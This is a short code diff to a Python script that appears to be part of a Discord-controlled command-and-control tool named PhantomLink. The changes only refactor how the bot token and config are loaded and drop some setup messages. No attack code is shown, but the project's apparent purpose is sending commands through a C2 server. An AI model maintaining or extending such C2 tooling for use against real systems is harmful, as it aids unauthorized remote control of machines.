@@ -20,8 +20,7 @@ if __name__ == "__main__":
     if hasattr(sys.stdout, "buffer") and getattr(sys.stdout, "encoding", "").lower() != "utf-8":
         sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
 import os
-sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from config import DISCORD_BOT_TOKEN, DISCORD_WEBHOOK, API_KEY as CONFIG_API_KEY, SERVER_PORT
+import config
 DISCORD_CHANNEL_ID = 1525081606501568577
 
 # C2 Server config
@@ -916,15 +915,11 @@ def _send_commands_sync(commands):
 
 
 async def main():
-    from config import DISCORD_BOT_TOKEN
-    if not DISCORD_BOT_TOKEN or DISCORD_BOT_TOKEN.strip() == "":
-        print("[!] Discord Bot Token is empty!")
-        print("[*] To enable Discord Bot, set PHANTOMLINK_BOT_TOKEN in your .env file or config.py.")
-        print("[*] Note: C2 Server and Discord Webhook notifications will still run normally.")
+    token = config.DISCORD_BOT_TOKEN
+    if not token.strip():
         return
-
     try:
-        await bot.start(DISCORD_BOT_TOKEN)
+        await client.start(token)
     except discord.LoginFailure:
         print("[!] Invalid or Expired Discord Bot Token!")
         print("[*] Please check PHANTOMLINK_BOT_TOKEN in your .env file.")
